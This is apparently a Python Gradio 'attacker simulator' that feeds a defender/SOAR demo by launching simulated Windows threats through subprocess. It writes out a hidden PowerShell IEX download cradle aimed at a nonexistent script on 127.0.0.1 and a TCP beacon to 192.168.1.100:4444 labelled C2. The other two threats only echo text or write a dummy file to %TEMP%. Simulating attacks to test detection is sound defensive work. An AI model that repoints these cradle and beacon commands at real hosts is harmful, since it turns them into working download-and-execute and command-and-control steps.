"""SentinelOneX V4.0 - ATTACKER SIMULATOR
Runs on Port 7860
Purpose: Simple threat launcher for "Attacker vs Defender" demo narrative
"""

import gradio as gr
import subprocess
import time
import json

# --- Threat Simulation Functions ---

def launch_powershell_threat():
    """Launch PowerShell download cradle attack (fileless threat)"""
    print("[ATTACKER] Launching PowerShell cradle threat...")
    
    cmd_to_run = 'powershell.exe -NoP -WindowStyle Hidden "IEX (New-Object Net.WebClient).DownloadString(\'http://127.0.0.1/nonexistent-malware.ps1\')"'
    
    DETACHED_PROCESS = 0x00000008
    try:
        process = subprocess.Popen(cmd_to_run, shell=True, creationflags=DETACHED_PROCESS)
        pid = process.pid
        time.sleep(1)
        print(f"[ATTACKER] ✅ Threat launched! PID: {pid}")
        return f"✅ ATTACK LAUNCHED\n\nProcess ID: {pid}\nCommand: PowerShell Download Cradle\nStatus: ACTIVE\n\n>>> Switch to Defender Tab to watch the response <<<", pid
    except Exception as e:
        error_msg = f"❌ Launch Failed: {str(e)}"
        print(f"[ATTACKER] {error_msg}")
        return error_msg, None

def launch_registry_threat():
    """Launch Registry Persistence attack"""
    print("[ATTACKER] Launching Registry persistence threat...")
    
    cmd_to_run = f'powershell.exe -NoP "Write-Host windows_update_service"'
    
    DETACHED_PROCESS = 0x00000008
    try:
        process = subprocess.Popen(cmd_to_run, shell=True, creationflags=DETACHED_PROCESS)
        pid = process.pid
        time.sleep(1)
        print(f"[ATTACKER] ✅ Registry threat launched! PID: {pid}")
        return f"✅ ATTACK LAUNCHED\n\nProcess ID: {pid}\nAttack Type: Registry Persistence\nStatus: ACTIVE\n\n>>> Switch to Defender Tab to watch the response <<<", pid
    except Exception as e:
        error_msg = f"❌ Launch Failed: {str(e)}"
        print(f"[ATTACKER] {error_msg}")
        return error_msg, None

def launch_staging_threat():
    """Launch File Staging attack"""
    print("[ATTACKER] Launching File staging threat...")
    
    cmd_to_run = 'cmd.exe /c "echo malicious_payload > %TEMP%\\staged_malware.bin"'
    
    DETACHED_PROCESS = 0x00000008
    try:
        process = subprocess.Popen(cmd_to_run, shell=True, creationflags=DETACHED_PROCESS)
        pid = process.pid
        time.sleep(1)
        print(f"[ATTACKER] ✅ Staging threat launched! PID: {pid}")
        return f"✅ ATTACK LAUNCHED\n\nProcess ID: {pid}\nAttack Type: File Staging\nStatus: ACTIVE\n\n>>> Switch to Defender Tab to watch the response <<<", pid
    except Exception as e:
        error_msg = f"❌ Launch Failed: {str(e)}"
        print(f"[ATTACKER] {error_msg}")
        return error_msg, None

def launch_c2_threat():
    """Launch Network C2 attack"""
    print("[ATTACKER] Launching Network C2 threat...")
    
    cmd_to_run = 'powershell.exe -NoP "try { $s = New-Object Net.Sockets.TcpClient; $s.Connect(\'192.168.1.100\', 4444) } catch {}"'
    
    DETACHED_PROCESS = 0x00000008
    try:
        process = subprocess.Popen(cmd_to_run, shell=True, creationflags=DETACHED_PROCESS)
        pid = process.pid
        time.sleep(1)
        print(f"[ATTACKER] ✅ C2 threat launched! PID: {pid}")
        return f"✅ ATTACK LAUNCHED\n\nProcess ID: {pid}\nAttack Type: Network C2\nStatus: ACTIVE\n\n>>> Switch to Defender Tab to watch the response <<<", pid
    except Exception as e:
        error_msg = f"❌ Launch Failed: {str(e)}"
        print(f"[ATTACKER] {error_msg}")
        return error_msg, None

# --- Gradio UI ---

with gr.Blocks(theme=gr.themes.Soft(primary_hue="red")) as demo:
    gr.Markdown("""
# 🔴 SentinelOneX V4.0 - ATTACKER SIMULATOR
## Threat Launch Console

**Instructions:** 
1. Select an attack type below
2. Click the button to launch
3. Switch to the **DEFENDER** tab (Port 7861) to watch the AI response in real-time

---
""")

    gr.Markdown("## 🎯 Select Attack Type & Launch")
    
    with gr.Row():
        with gr.Column(scale=2):
            attack_selector = gr.Radio(
                choices=[
                    "Fileless Attack (PowerShell Cradle)",
                    "Registry Persistence",
                    "File Staging",
                    "Network C2"
                ],
                value="Fileless Attack (PowerShell Cradle)",
                label="Attack Type",
                interactive=True
            )
        with gr.Column(scale=1):
            launch_btn = gr.Button("🚀 LAUNCH ATTACK", variant="danger", scale=2, size="lg")
    
    gr.Markdown("---")
    
    # Output areas
    attack_output = gr.Textbox(
        label="Attack Status",
        lines=8,
        interactive=False,
        elem_classes="output-box"
    )
    
    pid_output = gr.Number(label="Process ID", interactive=False, visible=False)
    
    gr.Markdown("""
---
## 💡 How This Works

1. **Attacker Tab (This Window)**: You launch threats here
2. **Defender Tab (Port 7861)**: The SOAR platform detects and responds autonomously

This demonstrates:
- ✅ Real threat simulation
- ✅ Autonomous threat detection (Sentry)
- ✅ Dual AI analysis (Flash + Pro)
- ✅ Automatic remediation

**Watch the magic happen!** 🛡️
""")

    # Wire the launch button
    def launch_attack(attack_type):
        handlers = {
            "Fileless Attack (PowerShell Cradle)": launch_powershell_threat,
            "Registry Persistence": launch_registry_threat,
            "File Staging": launch_staging_threat,
            "Network C2": launch_c2_threat,
        }
        handler = handlers.get(attack_type, launch_powershell_threat)
        output, pid = handler()
        return output, pid

    launch_btn.click(
        fn=launch_attack,
        inputs=[attack_selector],
        outputs=[attack_output, pid_output],
        queue=False  # Disable queueing for Python 3.14 compatibility
    )

if __name__ == "__main__":
    print("[ATTACKER APP] Starting on port 7860...")
    demo.launch(server_name="127.0.0.1", server_port=7860, share=False)
